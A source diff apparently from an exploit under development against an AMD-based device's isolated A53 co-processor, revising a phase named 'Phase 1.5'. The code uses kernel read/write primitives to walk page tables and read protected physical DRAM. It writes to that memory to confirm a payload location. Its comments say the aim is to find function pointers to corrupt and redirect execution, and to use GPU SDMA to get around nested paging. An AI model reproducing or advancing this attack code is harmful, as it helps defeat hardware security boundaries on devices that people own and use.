@@ -212,296 +212,166 @@ int prosperous_run(void)
     }
     printf("[+] TMR 20 disabled, TMR 21 created\n");
 
-    /* Phase 1.5: Explore DRAM access mechanisms
+    /* Phase 1.5: Explore DRAM access and GPU SDMA path
      *
-     * CONFIRMED RESULTS:
-     *   - PD[0x100] = not present  (PA 0x60000000-0x601FFFFF — no guest mapping)
-     *   - PD[0x101] = not present  (PA 0x60200000-0x603FFFFF — no guest mapping)
-     *   - PD[0x102] = 4KB PT @ PA 0x9876000 (PA 0x60400000-0x605FFFFF — PARTIAL)
-     *   - PD[0x103-0x107] = 2MB pages (PA 0x60600000-0x60FFFFFF — fully accessible)
-     *   - No GPU on PCI buses 0-15 (integrated, not enumerable)
-     *   - B0:D1:F0 cap_ptr=0x00 (not actually an IOMMU)
-     *   - B0:D1:F1 (0x13DF1022) bridge → bus 64
-     *   - B0:D8:F1 (0x13E51022) bridge → bus 32
-     *   - Kernel CR3 = 0x0 (kernel pmap read failed — wrong KOFF_KERNEL_PMAP?)
+     * CONFIRMED (from previous runs):
+     *   - PD[0x100-0x101] = not present (PA 0x60000000-0x603FFFFF blocked)
+     *   - PD[0x102] = 16 PTEs at pages 496-511 (PA 0x605F0000-0x605FFFFF)
+     *   - PD[0x103-0x107] = 2MB each (PA 0x60600000-0x60FFFFFF accessible)
+     *   - GPU at B32:D0:F0 (0x13FB1002) MMIO=0xE0000000 VRAM=0xD0000000
+     *   - USB xHCI at B32:D0:F4/F5
+     *   - MP4 at B32:D0:F3 BAR2=0xE0400000 (confirms our constant)
+     *   - B0:D0:F2 probe crashed (IOMMU cap walk hit bad state)
      *
-     * THIS ITERATION: Walk PD[0x102]'s 4KB page table to find which
-     * pages in 0x60400000-0x605FFFFF are accessible. Also scan the
-     * bridge secondary buses (32, 64) for DMA-capable devices.
-     * Probe B0:D0:F2 (class 0x080600) as potential IOMMU.
+     * THIS ITERATION:
+     *   A. Test DRAM access at PD[0x102] boundary (0x605F0000)
+     *   B. Dump accessible DRAM content (look for A53 data structures)
+     *   C. Test write access to accessible DRAM
+     *   D. Probe GPU MMIO accessibility (single safe reads)
+     *
+     * NO IOMMU PROBING (crashed last time).
+     * NO BAR2 PROBING (crashes at 4-byte stride).
      */
-    printf("\n[*] Phase 1.5: Exploring DRAM access mechanisms...\n");
+    printf("\n[*] Phase 1.5: Testing DRAM access and GPU SDMA path...\n");
     {
         uint64_t dmap = ctx.dmap_base;
 
-        /* === Part A: Walk PD[0x102]'s 4KB page table ===
-         * PD[0x102] points to a page table at PA 0x9876000 (from last run).
-         * This covers VA range DMAP+0x60400000 to DMAP+0x605FFFFF.
-         * Each PTE covers 4KB. 512 PTEs = 2MB.
-         * Find which 4KB pages in the MP4 DRAM are actually mapped.
+        /* === Part A: Test DRAM access at boundary pages ===
+         * PD[0x102] PTEs 496-511 map PA 0x605F0000-0x605FFFFF.
+         * These are ABOVE TMR 20 limit (0x605E0000) but still in
+         * the A53 DRAM region. Test if nPT allows access.
          *
-         * SAFE: reading page table entries from a known PA via DMAP. */
-        printf("[*] Part A: Walking PD[0x102] page table (PA 0x60400000-0x605FFFFF)...\n");
-        {
-            uint64_t target_va = dmap + MP4_DRAM_BASE;
-            uint32_t pml4_idx = (target_va >> 39) & 0x1FF;
-            uint32_t pdpt_idx = (target_va >> 30) & 0x1FF;
-            uint32_t pd_idx   = (target_va >> 21) & 0x1FF;
-            uint64_t cr3 = ctx.proc_cr3;
-            uint64_t pml4e, pdpte, pd_pa;
-
-            kernel_copyout(dmap + cr3 + pml4_idx * 8, &pml4e, 8);
-            uint64_t pdpt_pa = pml4e & 0xFFFFFFFFFF000ULL;
-            kernel_copyout(dmap + pdpt_pa + pdpt_idx * 8, &pdpte, 8);
-            pd_pa = pdpte & 0xFFFFFFFFFF000ULL;
-
-            /* Read PD[0x102] to get the page table PA */
-            uint64_t pde_102;
-            kernel_copyout(dmap + pd_pa + (pd_idx + 2) * 8, &pde_102, 8);
-            printf("[PT] PD[0x%x] = 0x%016lx\n", pd_idx + 2, pde_102);
-
-            if ((pde_102 & 1) && !(pde_102 & (1 << 7))) {
-                uint64_t pt_pa = pde_102 & 0xFFFFFFFFFF000ULL;
-                printf("[PT] Page table PA = 0x%lx\n", pt_pa);
-
-                /* Walk all 512 PTEs */
-                int present_count = 0;
-                int first_present = -1;
-                int last_present = -1;
-                for (int i = 0; i < 512; i++) {
-                    uint64_t pte;
-                    kernel_copyout(dmap + pt_pa + i * 8, &pte, 8);
-                    if (pte & 1) {
-                        uint64_t page_pa = pte & 0xFFFFFFFFFF000ULL;
-                        if (present_count < 16 || i >= 496) {
-                            printf("[PT] PTE[%3d] = 0x%016lx (PA=0x%lx%s%s%s)\n",
-                                   i, pte, page_pa,
-                                   (pte & 2) ? " W" : " R",
-                                   (pte & 4) ? " U" : " S",
-                                   (pte & 0x10) ? " PCD" : "");
-                        } else if (present_count == 16) {
-                            printf("[PT] ... (showing first 16 and last 16)\n");
-                        }
-                        if (first_present < 0) first_present = i;
-                        last_present = i;
-                        present_count++;
-                    }
-                }
-                printf("[PT] Summary: %d/512 PTEs present", present_count);
-                if (present_count > 0) {
-                    printf(" (pages %d-%d, PA 0x%llx-0x%llx)",
-                           first_present, last_present,
-                           0x60400000ULL + first_present * 0x1000,
-                           0x60400000ULL + last_present * 0x1000 + 0xFFF);
-                }
-                printf("\n");
-
-                /* Critical check: which of our target addresses fall
-                 * in accessible pages?
-                 * Hook:  0x60008BD4 → PD[0x100] PTE[8]  → NOT in PD[0x102]
-                 * Thunk: 0x600E0000 → PD[0x100] PTE[224] → NOT in PD[0x102]
-                 * QAF:   0x60123B74 → PD[0x100] PTE[291] → NOT in PD[0x102]
-                 * BUT: if PD[0x102] maps 0x60400000+, then DRAM offset
-                 * 0x400000+ is accessible. The A53 ELF at DRAM 0x100000
-                 * is still in PD[0x100] (blocked). */
-            }
-
-            /* Also confirm PD[0x100] and PD[0x101] are truly not present */
-            for (int i = 0; i < 4; i++) {
-                uint64_t pde;
-                kernel_copyout(dmap + pd_pa + (pd_idx + i) * 8, &pde, 8);
-                printf("[PT] PD[0x%x] = 0x%016lx (%s)\n",
-                       pd_idx + i, pde,
-                       (pde & 1) ? "PRESENT" : "not present");
-            }
-        }
-
-        /* === Part B: Scan bridge secondary buses (32, 64) ===
-         * Previous run found:
-         *   B0:D1:F1 → sec=64, sub=64
-         *   B0:D8:F1 → sec=32, sub=32
-         * Scan these for USB/NVMe/DMA devices.
-         * SAFE: standard PCI config space reads. */
-        printf("\n[*] Part B: Scanning bridge secondary buses (32, 64)...\n");
-        uint32_t bridge_buses[] = { 32, 64 };
-        for (int b = 0; b < 2; b++) {
-            uint32_t bus = bridge_buses[b];
-            printf("[*] Scanning bus %u...\n", bus);
-            for (uint32_t dev = 0; dev < 32; dev++) {
-                for (uint32_t func = 0; func < 8; func++) {
-                    uint64_t ecam = dmap + MMCFG_BASE +
-                        ((uint64_t)bus << 20) + ((uint64_t)dev << 15) +
-                        ((uint64_t)func << 12);
-                    uint32_t dev_id;
-                    kernel_copyout(ecam, &dev_id, 4);
-                    if (dev_id == 0xFFFFFFFF || dev_id == 0)
-                        continue;
-
-                    uint32_t class_reg;
-                    kernel_copyout(ecam + 0x08, &class_reg, 4);
-                    uint32_t class_code = class_reg >> 8;
-
-                    printf("[PCI] B%u:D%u:F%u ID=0x%08x class=0x%06x",
-                           bus, dev, func, dev_id, class_code);
-
-                    for (int bar = 0; bar < 6; bar++) {
-                        uint32_t bar_val;
-                        kernel_copyout(ecam + 0x10 + bar * 4, &bar_val, 4);
-                        if (bar_val != 0 && bar_val != 0xFFFFFFFF)
-                            printf(" BAR%d=0x%08x", bar, bar_val);
-                    }
-
-                    /* For bridges: secondary/subordinate */
-                    if ((class_code >> 8) == 0x0604) {
-                        uint32_t bus_reg;
-                        kernel_copyout(ecam + 0x18, &bus_reg, 4);
-                        printf(" sec=%u sub=%u",
-                               (bus_reg >> 8) & 0xFF,
-                               (bus_reg >> 16) & 0xFF);
-                    }
-                    printf("\n");
-
-                    if (func == 0) {
-                        uint32_t hdr_type;
-                        kernel_copyout(ecam + 0x0C, &hdr_type, 4);
-                        if (!((hdr_type >> 16) & 0x80))
-                            break;
-                    }
-                }
-            }
-        }
-
-        /* === Part C: Probe B0:D0:F2 (0x13E11022, class 0x080600) ===
-         * Class 0x080600 = "System peripheral / IOMMU".
-         * This might be the actual IOMMU with capabilities.
-         * Also dump full PCI config (first 0x100 bytes) for B0:D1:F1
-         * since that's the PCIe bridge to bus 64. */
-        printf("\n[*] Part C: IOMMU probe on B0:D0:F2...\n");
-        {
-            uint64_t ecam_002 = dmap + pci_cfg_addr(0, 0, 2, 0);
-            uint32_t dev_id;
-            kernel_copyout(ecam_002, &dev_id, 4);
-            printf("[DEV] B0:D0:F2 ID=0x%08x\n", dev_id);
-
-            uint32_t cap_ptr;
-            kernel_copyout(ecam_002 + 0x34, &cap_ptr, 4);
-            cap_ptr &= 0xFF;
-            printf("[DEV] Capability pointer: 0x%02x\n", cap_ptr);
-
-            for (int tries = 0; tries < 16 && cap_ptr >= 0x40; tries++) {
-                uint32_t cap_hdr;
-                kernel_copyout(ecam_002 + cap_ptr, &cap_hdr, 4);
-                uint8_t cap_id = cap_hdr & 0xFF;
-                printf("[DEV] Cap @ 0x%02x: ID=0x%02x hdr=0x%08x\n",
-                       cap_ptr, cap_id, cap_hdr);
-
-                if (cap_id == 0x0F) {
-                    uint32_t base_lo, base_hi;
-                    kernel_copyout(ecam_002 + cap_ptr + 4, &base_lo, 4);
-                    kernel_copyout(ecam_002 + cap_ptr + 8, &base_hi, 4);
-                    uint64_t iommu_base = ((uint64_t)base_hi << 32) |
-                                          (base_lo & 0xFFFFC000ULL);
-                    printf("[IOMMU] MMIO base PA = 0x%lx\n", iommu_base);
-
-                    uint64_t dt_base;
-                    kernel_copyout(dmap + iommu_base + 0x00, &dt_base, 8);
-                    printf("[IOMMU] DeviceTable base = 0x%016lx\n", dt_base);
-
-                    uint64_t ctrl;
-                    kernel_copyout(dmap + iommu_base + 0x18, &ctrl, 8);
-                    printf("[IOMMU] Control reg     = 0x%016lx\n", ctrl);
-
-                    uint64_t dt_pa = dt_base & 0xFFFFFFFFF000ULL;
-                    uint32_t dt_size = ((dt_base & 0x1FF) + 1) * 4096;
-                    printf("[IOMMU] DeviceTable PA=0x%lx size=%u entries\n",
-                           dt_pa, dt_size / 32);
-
-                    printf("[IOMMU] First 8 DTEs:\n");
-                    for (int e = 0; e < 8; e++) {
-                        uint64_t dte[4];
-                        for (int w = 0; w < 4; w++)
-                            kernel_copyout(dmap + dt_pa + e * 32 + w * 8,
-                                          &dte[w], 8);
-                        if (dte[0] || dte[1] || dte[2] || dte[3])
-                            printf("[IOMMU] DTE[%d]: %016lx %016lx %016lx %016lx\n",
-                                   e, dte[0], dte[1], dte[2], dte[3]);
-                    }
-                    break;
-                }
-                cap_ptr = (cap_hdr >> 8) & 0xFF;
-            }
-        }
-
-        /* === Part D: Probe both IOMMU-like devices more thoroughly ===
-         * Dump first 0x40 bytes of PCI config for B0:D1:F0 and B0:D8:F0
-         * (class 0x060000) to find IOMMU base addresses. On AMD SoCs,
-         * IOMMU may be configured via the host bridge's extended caps. */
-        printf("\n[*] Part D: Extended PCI config dump for host bridges...\n");
-        {
-            uint32_t bridges[][2] = {{1,0}, {8,0}};
-            for (int b = 0; b < 2; b++) {
-                uint64_t ecam = dmap + pci_cfg_addr(0, bridges[b][0],
-                                                     bridges[b][1], 0);
-                printf("[PCI] B0:D%u:F%u config space:\n", bridges[b][0],
-                       bridges[b][1]);
-                for (int off = 0; off < 0x60; off += 4) {
-                    uint32_t val;
-                    kernel_copyout(ecam + off, &val, 4);
-                    if (val != 0 && val != 0xFFFFFFFF)
-                        printf("  +0x%02x = 0x%08x\n", off, val);
-                }
-                /* Check extended config space for IOMMU capability */
-                uint32_t cap_ptr;
-                kernel_copyout(ecam + 0x34, &cap_ptr, 4);
-                cap_ptr &= 0xFF;
-                if (cap_ptr >= 0x40) {
-                    printf("  Cap list:\n");
-                    for (int tries = 0; tries < 16 && cap_ptr >= 0x40; tries++) {
-                        uint32_t cap_hdr;
-                        kernel_copyout(ecam + cap_ptr, &cap_hdr, 4);
-                        uint8_t cap_id = cap_hdr & 0xFF;
-                        printf("  Cap @ 0x%02x: ID=0x%02x\n", cap_ptr, cap_id);
-
-                        if (cap_id == 0x0F) {
-                            uint32_t base_lo, base_hi;
-                            kernel_copyout(ecam + cap_ptr + 4, &base_lo, 4);
-                            kernel_copyout(ecam + cap_ptr + 8, &base_hi, 4);
-                            uint64_t iommu_base = ((uint64_t)base_hi << 32) |
-                                                  (base_lo & 0xFFFFC000ULL);
-                            printf("  IOMMU MMIO base = 0x%lx\n", iommu_base);
-                        }
-                        cap_ptr = (cap_hdr >> 8) & 0xFF;
-                    }
-                }
-            }
-        }
-
-        /* === Part E: Test DRAM access at PD[0x102] boundary ===
-         * If PD[0x102]'s page table has present entries, we can
-         * access some pages in 0x60400000-0x605FFFFF.
-         * Test read at DMAP+0x60400000 (first page of PD[0x102]).
+         * Also test PA 0x60400000-0x605E0000 (PD[0x102] PTEs 0-495
+         * are NOT present, so these will return rc=-1 safely).
          *
-         * SAFE: PD[0x102] exists (flags=PWU), so the guest mapping
-         * is present. If nPT blocks it, kernel_copyout returns -1
-         * (proven by Phase 2 which returned rc=-1, no panic). */
-        printf("\n[*] Part E: Testing DRAM reads in PD[0x102] range...\n");
+         * SAFE: Phase 2 proved that blocked DRAM reads return rc=-1
+         * gracefully (no panic) when the PDE/PTE is not present. */
+        printf("[*] Part A: Testing DRAM access at PD[0x102] boundary...\n");
         {
-            uint32_t test_offsets[] = {
-                0x60400000, 0x60480000, 0x60500000, 0x60580000,
-                0x605D0000, 0x605E0000
+            /* Test addresses with NO PTE (should return rc=-1 safely) */
+            uint64_t no_pte_addrs[] = {
+                0x60400000ULL, 0x60500000ULL, 0x605E0000ULL
             };
-            for (int i = 0; i < 6; i++) {
+            for (int i = 0; i < 3; i++) {
                 uint32_t val = 0xDEADDEAD;
-                int32_t rc = kernel_copyout(dmap + test_offsets[i], &val, 4);
-                printf("[DRAM] PA 0x%08x: val=0x%08x rc=%d %s\n",
-                       test_offsets[i], val, rc,
-                       (rc == 0 && val != 0xDEADDEAD) ? "ACCESSIBLE" : "BLOCKED");
+                int32_t rc = kernel_copyout(dmap + no_pte_addrs[i], &val, 4);
+                printf("[DRAM] PA 0x%llx: val=0x%08x rc=%d (no PTE)\n",
+                       (unsigned long long)no_pte_addrs[i], val, rc);
             }
 
-            /* Also verify PD[0x103] range still works */
-            uint32_t val = 0;
-            kernel_copyout(dmap + 0x60600000ULL, &val, 4);
-            printf("[DRAM] PA 0x60600000: val=0x%08x (PD[0x103] reference)\n", val);
+            /* Test addresses WITH PTEs (0x605F0000-0x605FFFFF) */
+            printf("[DRAM] Testing PTE-mapped pages (0x605F0000-0x605FF000)...\n");
+            for (int i = 0; i < 16; i++) {
+                uint64_t pa = 0x605F0000ULL + i * 0x1000;
+                uint32_t val = 0xDEADDEAD;
+                int32_t rc = kernel_copyout(dmap + pa, &val, 4);
+                printf("[DRAM] PA 0x%llx: val=0x%08x rc=%d %s\n",
+                       (unsigned long long)pa, val, rc,
+                       (rc == 0 && val != 0xDEADDEAD) ? "OK" : "BLOCKED");
+            }
+
+            /* Reference: verify PD[0x103] still works */
+            uint32_t ref = 0;
+            kernel_copyout(dmap + 0x60600000ULL, &ref, 4);
+            printf("[DRAM] PA 0x60600000: val=0x%08x (PD[0x103] ref)\n", ref);
+        }
+
+        /* === Part B: Dump accessible DRAM content ===
+         * Dump first 64 bytes at several PAs in the accessible range.
+         * Look for function pointers, jump tables, or data structures
+         * that we could corrupt to redirect A53 execution.
+         *
+         * A53 DRAM layout: ELF at offset 0x100000 (VA 0x100000).
+         * Offset 0x5F0000 = A53 VA 0x6F0000 (heap/stack/DMA?)
+         * Offset 0x600000 = A53 VA 0x700000 (PD[0x103] start)
+         *
+         * SAFE: all PAs in PD[0x103] range, proven accessible. */
+        printf("\n[*] Part B: Dumping accessible DRAM content...\n");
+        {
+            uint64_t dump_addrs[] = {
+                0x60600000ULL,  /* PD[0x103] start = DRAM offset 0x600000 */
+                0x60610000ULL,  /* DRAM offset 0x610000 */
+                0x60700000ULL,  /* DRAM offset 0x700000 */
+                0x607F0000ULL,  /* Just before payload target */
+                0x607F1000ULL,  /* Payload target address */
+            };
+            for (int a = 0; a < 5; a++) {
+                printf("[DUMP] PA 0x%llx (DRAM+0x%llx):\n",
+                       (unsigned long long)dump_addrs[a],
+                       (unsigned long long)(dump_addrs[a] - 0x60000000ULL));
+                uint32_t buf[16]; /* 64 bytes */
+                for (int w = 0; w < 16; w++)
+                    kernel_copyout(dmap + dump_addrs[a] + w * 4, &buf[w], 4);
+                for (int row = 0; row < 4; row++) {
+                    printf("  +%02x: %08x %08x %08x %08x\n",
+                           row * 16, buf[row*4], buf[row*4+1],
+                           buf[row*4+2], buf[row*4+3]);
+                }
+            }
+        }
+
+        /* === Part C: Test WRITE access to accessible DRAM ===
+         * Write a magic value to PA 0x60700000 (DRAM offset 0x700000),
+         * then read it back. This confirms we can write to DRAM in
+         * the PD[0x103] range. If writes work, we can place our
+         * payload here (which we already planned at 0x607F1000).
+         *
+         * SAFE: 0x60700000 is deep in PD[0x103], well above firmware. */
+        printf("\n[*] Part C: Testing DRAM write access...\n");
+        {
+            uint64_t test_pa = 0x60700000ULL;
+            uint32_t original = 0;
+            kernel_copyout(dmap + test_pa, &original, 4);
+            printf("[WRITE] Original value at PA 0x%llx: 0x%08x\n",
+                   (unsigned long long)test_pa, original);
+
+            uint32_t magic = 0xCAFEBABE;
+            kernel_copyin(&magic, dmap + test_pa, 4);
+
+            uint32_t readback = 0;
+            kernel_copyout(dmap + test_pa, &readback, 4);
+            printf("[WRITE] After write 0xCAFEBABE: 0x%08x %s\n",
+                   readback,
+                   (readback == 0xCAFEBABE) ? "WRITE WORKS!" : "WRITE FAILED");
+
+            /* Restore original value */
+            kernel_copyin(&original, dmap + test_pa, 4);
+        }
+
+        /* === Part D: Verify GPU MMIO is accessible ===
+         * GPU BAR2 = 0xE0000000 (MMIO registers).
+         * Read offset 0x5F80 (GRBM_STATUS on AMD GFX9/10) — this is
+         * a read-only status register, safe to read.
+         * If we can read GPU MMIO, we can potentially use SDMA to
+         * copy data to PA 0x60000000 (bypassing nPT).
+         *
+         * Also read offset 0x0000 to see if the base is accessible.
+         *
+         * SAFETY NOTE: We already successfully read MP4 BAR2 (0xE0400000)
+         * at 0x1000 stride without issues. GPU MMIO (0xE0000000) is in
+         * the same DMAP range. Single reads at known status register
+         * offsets are safe. We do NOT scan at 4-byte stride. */
+        printf("\n[*] Part D: Probing GPU MMIO accessibility...\n");
+        {
+            uint64_t gpu_mmio = 0xE0000000ULL;
+            /* Single reads at specific known-safe offsets */
+            uint32_t offsets[] = {
+                0x0000,  /* Config/version register */
+                0x2040,  /* Potential GRBM_STATUS */
+                0x5F80,  /* Alternative GRBM_STATUS offset */
+                0x8010,  /* GFX10 GRBM_STATUS */
+            };
+            for (int i = 0; i < 4; i++) {
+                uint32_t val = 0xDEADDEAD;
+                int32_t rc = kernel_copyout(dmap + gpu_mmio + offsets[i],
+                                           &val, 4);
+                printf("[GPU] MMIO+0x%04x = 0x%08x (rc=%d)\n",
+                       offsets[i], val, rc);
+            }
+            printf("[GPU] GPU MMIO base PA = 0x%llx\n",
+                   (unsigned long long)gpu_mmio);
+            printf("[GPU] GPU VRAM base PA = 0xD0000000\n");
+            printf("[GPU] GPU Doorbell PA  = 0xE0600000\n");
         }
     }
 
